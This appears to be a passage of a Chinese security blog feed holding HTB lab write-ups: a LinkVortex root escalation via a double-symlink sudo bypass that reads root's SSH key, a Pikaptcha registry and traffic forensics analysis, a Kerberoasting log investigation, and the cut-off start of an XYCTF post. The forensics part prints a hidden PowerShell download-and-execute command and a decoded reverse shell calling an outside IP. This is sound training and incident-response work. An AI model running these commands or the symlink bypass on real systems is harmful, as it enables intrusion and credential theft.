src="https://img.dkdun.cn/v1/2025/12/4661678031b00741.png"></p><p>当前目录下的 <code>config.production.json</code> 文件复制到镜像内部的 <code>/var/lib/ghost/</code> 目录下</p><p>来读取一下 <code>/var/lib/ghost/config.production.json</code> 文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs yaml">&#123;<br>  <span class="hljs-attr">&quot;url&quot;:</span> <span class="hljs-string">&quot;http://localhost:2368&quot;</span>,<br>  <span class="hljs-attr">&quot;server&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;port&quot;:</span> <span class="hljs-number">2368</span>,<br>    <span class="hljs-attr">&quot;host&quot;:</span> <span class="hljs-string">&quot;::&quot;</span><br>  &#125;,<br>  <span class="hljs-attr">&quot;mail&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;transport&quot;:</span> <span class="hljs-string">&quot;Direct&quot;</span><br>  &#125;,<br>  <span class="hljs-attr">&quot;logging&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;transports&quot;:</span> [<span class="hljs-string">&quot;stdout&quot;</span>]<br>  &#125;,<br>  <span class="hljs-attr">&quot;process&quot;:</span> <span class="hljs-string">&quot;systemd&quot;</span>,<br>  <span class="hljs-attr">&quot;paths&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;contentPath&quot;:</span> <span class="hljs-string">&quot;/var/lib/ghost/content&quot;</span><br>  &#125;,<br>  <span class="hljs-attr">&quot;spam&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;user_login&quot;:</span> &#123;<br>        <span class="hljs-attr">&quot;minWait&quot;:</span> <span class="hljs-number">1</span>,<br>        <span class="hljs-attr">&quot;maxWait&quot;:</span> <span class="hljs-number">604800000</span>,<br>        <span class="hljs-attr">&quot;freeRetries&quot;:</span> <span class="hljs-number">5000</span><br>    &#125;<br>  &#125;,<br>  <span class="hljs-attr">&quot;mail&quot;:</span> &#123;<br>     <span class="hljs-attr">&quot;transport&quot;:</span> <span class="hljs-string">&quot;SMTP&quot;</span>,<br>     <span class="hljs-attr">&quot;options&quot;:</span> &#123;<br>      <span class="hljs-attr">&quot;service&quot;:</span> <span class="hljs-string">&quot;Google&quot;</span>,<br>      <span class="hljs-attr">&quot;host&quot;:</span> <span class="hljs-string">&quot;linkvortex.htb&quot;</span>,<br>      <span class="hljs-attr">&quot;port&quot;:</span> <span class="hljs-number">587</span>,<br>      <span class="hljs-attr">&quot;auth&quot;:</span> &#123;<br>        <span class="hljs-attr">&quot;user&quot;:</span> <span class="hljs-string">&quot;bob@linkvortex.htb&quot;</span>,<br>        <span class="hljs-attr">&quot;pass&quot;:</span> <span class="hljs-string">&quot;fibber-talented-worth&quot;</span><br>        &#125;<br>      &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>得到用户名和密码</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">bob<span class="hljs-keyword">@linkvortex</span>.<span class="hljs-attribute">htb</span>:fibber-talented-worth<br></code></pre></td></tr></table></figure><p>ssh 连接拿到 userflag</p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="sudo-l-查看可-sudo-执行的文件"><a href="#sudo-l-查看可-sudo-执行的文件" class="headerlink" title="sudo -l 查看可 sudo 执行的文件"></a>sudo -l 查看可 sudo 执行的文件</h2><p>用 <code>sudo -l</code> 发现可以执行 <code>/opt/ghost/</code> 目录下的 <code>clean_symlink.sh</code> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">bob@linkvortex:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> bob on linkvortex:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT<br><br>User bob may run the following commands on linkvortex:<br>    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png<br></code></pre></td></tr></table></figure><p>那么切入点应该就在这个文件上面，查看文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>QUAR_DIR=<span class="hljs-string">&quot;/var/quarantined&quot;</span><br><br><span class="hljs-keyword">if</span> [ -z <span class="hljs-variable">$CHECK_CONTENT</span> ];<span class="hljs-keyword">then</span><br>  CHECK_CONTENT=<span class="hljs-literal">false</span><br><span class="hljs-keyword">fi</span><br><br>LINK=<span class="hljs-variable">$1</span><br><br><span class="hljs-keyword">if</span> ! [[ <span class="hljs-string">&quot;<span class="hljs-variable">$LINK</span>&quot;</span> =~ \.png$ ]]; <span class="hljs-keyword">then</span><br>  /usr/bin/echo <span class="hljs-string">&quot;! First argument must be a png file !&quot;</span><br>  <span class="hljs-built_in">exit</span> 2<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> /usr/bin/sudo /usr/bin/test -L <span class="hljs-variable">$LINK</span>;<span class="hljs-keyword">then</span><br>  LINK_NAME=$(/usr/bin/basename <span class="hljs-variable">$LINK</span>)<br>  LINK_TARGET=$(/usr/bin/readlink <span class="hljs-variable">$LINK</span>)<br>  <span class="hljs-keyword">if</span> /usr/bin/echo <span class="hljs-string">&quot;<span class="hljs-variable">$LINK_TARGET</span>&quot;</span> | /usr/bin/grep -Eq <span class="hljs-string">&#x27;(etc|root)&#x27;</span>;<span class="hljs-keyword">then</span><br>    /usr/bin/echo <span class="hljs-string">&quot;! Trying to read critical files, removing link [ <span class="hljs-variable">$LINK</span> ] !&quot;</span><br>    /usr/bin/unlink <span class="hljs-variable">$LINK</span><br>  <span class="hljs-keyword">else</span><br>    /usr/bin/echo <span class="hljs-string">&quot;Link found [ <span class="hljs-variable">$LINK</span> ] , moving it to quarantine&quot;</span><br>    /usr/bin/mv <span class="hljs-variable">$LINK</span> <span class="hljs-variable">$QUAR_DIR</span>/<br>    <span class="hljs-keyword">if</span> <span class="hljs-variable">$CHECK_CONTENT</span>;<span class="hljs-keyword">then</span><br>      /usr/bin/echo <span class="hljs-string">&quot;Content:&quot;</span><br>      /usr/bin/cat <span class="hljs-variable">$QUAR_DIR</span>/<span class="hljs-variable">$LINK_NAME</span> 2&gt;/dev/null<br>    <span class="hljs-keyword">fi</span><br>  <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>检测传入的 <code>.png</code> 文件是否为符号链接，如果符号链接指向 <code>/etc</code> 或者 <code>/root</code> 目录就直接删除，不是的话就移动到 <code>/var/quarantined</code> 目录，当 <code>$CHECK_CONTENT= True</code>  时会执行 <code>cat</code> 命令显示读取的文件内容</p><h2 id="双层符号链接绕过检测"><a href="#双层符号链接绕过检测" class="headerlink" title="双层符号链接绕过检测"></a>双层符号链接绕过检测</h2><p>如果直接链接 <code>/root</code> 下的文件肯定会被检测到，绕过方法就是双层符号链接，将 <code>/root</code> 下的文件链接到其他文件夹下的文件，然后再链接为 <code>.png</code> 文件得以读取，因此我们在现在的目录下创建一个文件去链接 <code>/root/.ssh/id_rsa</code> 文件，然后用 ssh 私钥去登录 root 账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /root/.ssh/id_rsa rsa.txt<br><span class="hljs-built_in">ln</span> -s /home/bob/rsa.txt rsa.png<br><span class="hljs-built_in">sudo</span> CHECK_CONTENT=<span class="hljs-literal">true</span> /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/rsa.png<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/bf1aca72a04a5f6c.png"></p><p>将得到的私钥保存为 <code>id_rsa</code> 给 600 的权限登录</p><p><img src="https://img.dkdun.cn/v1/2025/12/d3c38f7b2c47fe7e.png"></p><p>成功进入 root 账户</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>symlinks</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Pikaptcha</title>
    <link href="/2025/04/13/HTB-Pikaptcha/"/>
    <url>/2025/04/13/HTB-Pikaptcha/</url>
    
    <content type="html"><![CDATA[<p>关于 Windows 的注册表取证</p><span id="more"></span><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest version of Microsoft Office. He had received an email saying he needed to update, and clicked the link to do it. He reported that he visited the website and solved a captcha, but no office download page came back. Alonzo, who himself was bombarded with phishing attacks last year and was now aware of attacker tactics, immediately notified the security team to isolate the machine as he suspected an attack. You are provided with network traffic and endpoint artifacts to answer questions about what happened.</p><h1 id="分析用户-happy-grunwald-的注册表配置单元，查找其下载并执行-stager-的完整命令"><a href="#分析用户-happy-grunwald-的注册表配置单元，查找其下载并执行-stager-的完整命令" class="headerlink" title="分析用户 happy grunwald 的注册表配置单元，查找其下载并执行 stager 的完整命令"></a>分析用户 happy grunwald 的注册表配置单元，查找其下载并执行 stager 的完整命令</h1><p>tree 一下发现文件中有多个用户（实际上也只用了一个）</p><p><img src="https://img.dkdun.cn/v1/2025/12/d79abedada005e31.png"></p><p>用 <a href="https://ericzimmerman.github.io/#!index.md">Registry Explorer</a> 打开 <code>Pikaptcha\2024-09-23T052209_alert_mssp_action\C\Users\happy.grunwald</code> 下的 <code>NTUSER.DAT</code> 文件，访问 <code>RunMRU</code> 文件夹，找到命令</p><p><img src="https://img.dkdun.cn/v1/2025/12/973c45ff742acec1.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">powershell -NoP -NonI -W Hidden -Exec Bypass -Command &quot;IEX(New-Object <span class="hljs-built_in">Net</span>.WebClient).DownloadString(&#x27;http://<span class="hljs-number">43</span>.<span class="hljs-number">205</span>.<span class="hljs-number">115</span>.<span class="hljs-number">44</span>/office2024install.ps1&#x27;)&quot;<br></code></pre></td></tr></table></figure><ul><li>NoP：NoProfile，不加载 PowerShell 配置文件，快速启动</li><li>NonI：Nonlnteractive，非交互模式</li><li>W Hidden：WindowStyle Hidden，隐藏 PowerShell 窗口，让用户无法察觉程序运行</li><li>Exec Bypass：ExecutionPolicy Bypass，绕过系统脚本执行策略</li><li>Command中的 <code>IRX</code>：Invoke-Expression，直接执行下载的脚本</li></ul><p>整个命令的作用就是：下载来自 IP <code>43.205.115.44</code> 的 <code>office2024install.ps1</code> 脚本，但下载和执行都被隐藏了</p><h1 id="payload-执行的-UTC-时间"><a href="#payload-执行的-UTC-时间" class="headerlink" title="payload 执行的 UTC 时间"></a>payload 执行的 UTC 时间</h1><p><img src="https://img.dkdun.cn/v1/2025/12/5e7f37e89844e2e7.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2024</span>-<span class="hljs-number">09</span>-<span class="hljs-number">23</span> <span class="hljs-number">05</span>:<span class="hljs-number">07</span>:<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><h1 id="找出该脚本的-SHA256-哈希值"><a href="#找出该脚本的-SHA256-哈希值" class="headerlink" title="找出该脚本的 SHA256 哈希值"></a>找出该脚本的 SHA256 哈希值</h1><p> 加载流量包，导出关于 <code>office2024install.ps1</code> 的文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/e8829d2cb860f285.png"></p><p>获取 hash 值</p><p><img src="https://img.dkdun.cn/v1/2025/12/45f2d3e3d99ce3f3.png"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">579284442094e1</span>a<span class="hljs-number">44</span>bea<span class="hljs-number">9</span>cfb<span class="hljs-number">7</span>d<span class="hljs-number">8</span>d<span class="hljs-number">794</span><span class="hljs-keyword">c</span><span class="hljs-number">8977714</span>f<span class="hljs-number">827</span><span class="hljs-keyword">c</span><span class="hljs-number">97</span>bcb<span class="hljs-number">2822</span>a<span class="hljs-number">97742914</span>de<br></code></pre></td></tr></table></figure><h1 id="反向-shell-连接的端口"><a href="#反向-shell-连接的端口" class="headerlink" title="反向 shell 连接的端口"></a>反向 shell 连接的端口</h1><p>把 <code>office2024install.ps1</code> 文件内容解码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">$client = New - Object System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;43.205.115.44&quot;</span>, <span class="hljs-number">6969</span>);<br>$stream = $client.GetStream(); [<span class="hljs-type">byte</span>[]] $bytes = <span class="hljs-number">0.</span><span class="hljs-number">.65535</span> | %&#123;<br>    <span class="hljs-number">0</span><br>&#125;;<br><span class="hljs-keyword">while</span> (($i = $stream.Read($bytes, <span class="hljs-number">0</span>, $bytes.Length)) - ne <span class="hljs-number">0</span>) &#123;;<br>    $data = (New - Object - TypeName System.Text.ASCIIEncoding).GetString($bytes, <span class="hljs-number">0</span>, $i);<br>    $sendback = (iex $data <span class="hljs-number">2</span> &gt; &amp;<span class="hljs-number">1</span> | Out - String);<br>    $sendback2 = $sendback + <span class="hljs-string">&quot;PS &quot;</span> + (pwd).Path + <span class="hljs-string">&quot;&gt; &quot;</span>;<br>    $sendbyte = ([text.encoding] : :ASCII).GetBytes($sendback2);<br>    $stream.Write($sendbyte, <span class="hljs-number">0</span>, $sendbyte.Length);<br>    $stream.Flush()<br>&#125;;<br>$client.Close()<br></code></pre></td></tr></table></figure><p>从中可以看出端口是 6969</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">6969</span><br></code></pre></td></tr></table></figure><h1 id="C2-和工作站之间的反向-shell-连接建立持续时间"><a href="#C2-和工作站之间的反向-shell-连接建立持续时间" class="headerlink" title="C2 和工作站之间的反向 shell 连接建立持续时间"></a>C2 和工作站之间的反向 shell 连接建立持续时间</h1><p>因为前面已经找到反向 shell 的端口号了，所以直接过滤就行</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">tcp.port<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">6969</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/1c4ba07cdcd823a4.png"></p><p>根据详细判断开始和结束时间，然后直接相减得到 403 s</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">403<br></code></pre></td></tr></table></figure><h1 id="包含-payload-的函数名称"><a href="#包含-payload-的函数名称" class="headerlink" title="包含 payload 的函数名称"></a>包含 payload 的函数名称</h1><p>过滤 IP 和端口，追踪 TCP 流发现下载 <code>BloodHound</code> 执行了 <code>SharpHound.ps1</code> 文件输出到 Windows 的 tmp 目录</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ip.<span class="hljs-attribute">addr</span>==43.205.115.44 &amp;&amp; tcp.<span class="hljs-attribute">port</span>==6969<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8b808ac416206d10.png"></p><p>这是一个能映射和量化 Active Directory 攻击路径的工具，但是在此并没有什么危害</p><p>过滤 http 数据包</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">http&amp;&amp;ip.<span class="hljs-attribute">addr</span>==43.205.115.44<br></code></pre></td></tr></table></figure><p>追踪 HTTP 流，发现 <code>stageClipboard()</code> 函数包含了 payload 命令</p><p><img src="https://img.dkdun.cn/v1/2025/12/51eb1e7f381ba720.png"></p><p>所以为</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">stageClipboard</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Campfire-1</title>
    <link href="/2025/04/11/HTB-Campfire-1/"/>
    <url>/2025/04/11/HTB-Campfire-1/</url>
    
    <content type="html"><![CDATA[<p> 来自 DC 的安全日志，受影响的 WorkStation 的 PowerShell 操作日志和 Prefetch 文件</p><span id="more"></span><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Alonzo Spotted Weird files on his computer and informed the newly assembled SOC Team. Assessing the situation it is believed a Kerberoasting attack may have occurred in the network. It is your job to confirm the findings by analyzing the provided evidence. You are provided with: 1- Security Logs from the Domain Controller 2- PowerShell-Operational Logs from the affected workstation 3- Prefetch Files from the affected workstation</p><h1 id="分析-DC-的安全日志确认-Kerberoasting-活动发生的日期和时间"><a href="#分析-DC-的安全日志确认-Kerberoasting-活动发生的日期和时间" class="headerlink" title="分析 DC 的安全日志确认 Kerberoasting 活动发生的日期和时间"></a>分析 DC 的安全日志确认 Kerberoasting 活动发生的日期和时间</h1><h2 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h2><p>先简单学习一下关于 Kerberos 的知识</p><p>Kerberos 是一种计算机网络认证协议，作用是进行身份验证</p><h3 id="身份验证过程"><a href="#身份验证过程" class="headerlink" title="身份验证过程"></a>身份验证过程</h3><ul><li>客户端向 KDC（Key Distribution Center，通常是域控制器）请求 TGT（Ticket Granting Ticket），请求用户的密钥之一用于预身份验证。TGT 由身份验证服务 (AS) 提供，客户端的请求被称为AS-REQ，应答被称为AS-REP。</li><li>客户端使用 TGT 向 KDC 请求 ST（服务票证）。该票证由票证授予服务 (TGS) 提供。客户端的请求被称为 TGS-REQ，应答被称为 TGS-REP。</li><li>客户端使用 ST（服务票证）来访问服务。客户端对服务的请求被称为调用 AP-REQ，服务的响应被称为调用 AP-REP。</li><li>两种票证（TGT 和 ST）通常都包含加密的 PAC（特权身份验证证书），目标服务将读取一组信息来决定身份验证用户是否可以访问该服务（用户 ID、组成员身份等）。</li></ul><h2 id="prefetch"><a href="#prefetch" class="headerlink" title="prefetch"></a>prefetch</h2><p>Windows 中的预读取文件夹，存放系统已访问的文件的预读信息，程序首次运行时会存储有关在加载该文件时访问的所有文件的信息，还存储元数据。</p><h2 id="kerberoasting-攻击"><a href="#kerberoasting-攻击" class="headerlink" title="kerberoasting 攻击"></a>kerberoasting 攻击</h2><p>kerberoasting 攻击是在 TGS_REP 过程中用户会收到由目标服务实例的 NTLM hash 加密的 TGS，如果得到了这个 TGS，由于该 TGS 是用服务端 hash 加密，那么客户端拿到 TGS 后可以本地爆破，如果字典足够大则能爆破出 SPN（服务主体名称） 链接用户的明文密码，当该服务在域内权限很高时，攻击者能接管整个域。</p><h2 id="分析-DC-的安全日志，确认-Kerberoasting-活动发生的日期和时间"><a href="#分析-DC-的安全日志，确认-Kerberoasting-活动发生的日期和时间" class="headerlink" title="分析 DC 的安全日志，确认 Kerberoasting 活动发生的日期和时间"></a>分析 DC 的安全日志，确认 Kerberoasting 活动发生的日期和时间</h2><p>查看 <code>Domain Controller</code> 中的安全日志，根据 kerberoasting 原理查看 TGS 相关日志，筛选事件 ID 4769，查找服务名称不为 <code>krbtgt</code> 或以 <code>$</code> 结尾（比如 DC01$ ）的任何事件。票证加密类型为 <code>0x17</code>，用于 RC4 类型加密，故障代码为 0x0</p><p><img src="https://img.dkdun.cn/v1/2025/12/0f7e4ec4280961ce.png"></p><p>时间转换成 UTC</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">21</span> <span class="hljs-number">11</span>:<span class="hljs-number">18</span>:<span class="hljs-number">09</span> -&gt; <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">21</span> <span class="hljs-number">03</span>:<span class="hljs-number">18</span>:<span class="hljs-number">09</span><br></code></pre></td></tr></table></figure><h1 id="查找目标服务名称"><a href="#查找目标服务名称" class="headerlink" title="查找目标服务名称"></a>查找目标服务名称</h1><p>目标服务在前面找到的事件中能发现名字为 <code>MSSQLService</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/3f6860db245f91d4.png"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">MSSQLService</span><br></code></pre></td></tr></table></figure><h1 id="工作站的-IP-地址"><a href="#工作站的-IP-地址" class="headerlink" title="工作站的 IP 地址"></a>工作站的 IP 地址</h1><p>查找 IP</p><p><img src="https://img.dkdun.cn/v1/2025/12/263f08631dacbce1.png"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.17.79.129</span><br></code></pre></td></tr></table></figure><h1 id="查找用于枚举-AD-对象并可能在网络中查找-Kerberoastable-帐户的文件名称"><a href="#查找用于枚举-AD-对象并可能在网络中查找-Kerberoastable-帐户的文件名称" class="headerlink" title="查找用于枚举 AD 对象并可能在网络中查找 Kerberoastable 帐户的文件名称"></a>查找用于枚举 AD 对象并可能在网络中查找 Kerberoastable 帐户的文件名称</h1><p>查看 <code>Workstation</code> 中的 <code>Powershell-Operational.evtx</code>，可以发现 ID 为 4104 的事件执行的全是远程命令执行</p><p><img src="https://img.dkdun.cn/v1/2025/12/d06951d0735d922a.png"></p><p>用 <a href="https://ericzimmerman.github.io/#!index.md">EvtxECmd</a> 将 <code>.evtx</code> 文件转化为 <code>.csv</code> 文件，丢入 Timeline Explorer 筛选 ID&#x3D;4104</p><p><img src="https://img.dkdun.cn/v1/2025/12/31ac189108678fec.png"></p><p>可以发现全是执行的 <code>C:\Users\alonzo.spire\Downloads</code> 下的 <code>powerview.ps1</code> </p><p>PowerView 是基于 PowerShell 的域渗透信息收集脚本，属于 <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a> 框架和 Empire 的一部分</p><p>对时间排序，可以看到首次 ID&#x3D;4104 的事件内容，开始执行 <code>PowerSploit File</code> 的 <code>PowerView.ps1</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/309b463038d814d3.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">PowerView.ps1<br></code></pre></td></tr></table></figure><h1 id="脚本开始执行时间"><a href="#脚本开始执行时间" class="headerlink" title="脚本开始执行时间"></a>脚本开始执行时间</h1><p>时间为 <code>2024/5/21 11:16:32</code> 转换为 UTC</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">21</span> <span class="hljs-number">03</span>:<span class="hljs-number">16</span>:<span class="hljs-number">32</span><br></code></pre></td></tr></table></figure><h1 id="查找执行-kerberoasting-攻击所用的工具的路径"><a href="#查找执行-kerberoasting-攻击所用的工具的路径" class="headerlink" title="查找执行 kerberoasting 攻击所用的工具的路径"></a>查找执行 kerberoasting 攻击所用的工具的路径</h1><p>用 <a href="https://ericzimmerman.github.io/#!index.md">PECmd</a> 将 <code>prefetch</code> 文件夹中的文件转化成 <code>.csv</code> 输出查看</p><p>查看输出的 <code>20250411131502_PECmd_Output_Timeline.csv</code> 文件，它记录了程序运行的时间</p><p>通过脚本执行的开始时间 <code>2024-05-21 03:16:32</code> 确定查找范围，发现运行了 <code>DOWNLOADS</code> 路径下的一个 <code>RUBEUS.EXE</code> </p><p><img src="https://img.dkdun.cn/v1/2025/12/cedebdfa1d18fa1f.png"></p><p>Rubeus 是一个针对 Kerberos 协议进行攻击的工具，所以路径为</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\USERS\ALONZO.SPIRE\DOWNLOADS\RUBEUS.EXE<br></code></pre></td></tr></table></figure><h1 id="查找攻击工具首次执行时间"><a href="#查找攻击工具首次执行时间" class="headerlink" title="查找攻击工具首次执行时间"></a>查找攻击工具首次执行时间</h1><p>查看 <code>20250411131502_PECmd_Output.csv</code> 文件，其中包含了程序运行的起止时间，运行次数等等</p><p>直接过滤出与 <code>RUBEUS.EXE</code> 有关的信息</p><p><img src="https://img.dkdun.cn/v1/2025/12/ab59c5c5ffce9d25.png"></p><p>所以时间为 Last Run 的时间</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">21</span> <span class="hljs-number">03</span>:<span class="hljs-number">18</span>:<span class="hljs-number">08</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kerberos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XYCTF 2025</title>
    <link href="/2025/04/08/XYCTF-2025/"/>
    <url>/2025/04/08/XYCTF-2025/</url>
    
    <content type="html"><![CDATA[<p>实力不行</p><span id="more"></span><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h2><p>（感觉这题有点该放逆向里面的）</p><p>有一个 task.exe，EP 查一下发现是 Pyinstaller 打包的 python 文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/907f2517c3fa05b9.png"></p><p>用 <code>pyinstxtractor</code> 解包</p><p><img src="https://img.dkdun.cn/v1/2025/12/810d3c5362cfc48c.png"></p><p>用 <a href="https://pylingual.io/">https://pylingual.io</a> 进行反编译，反编译结果如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 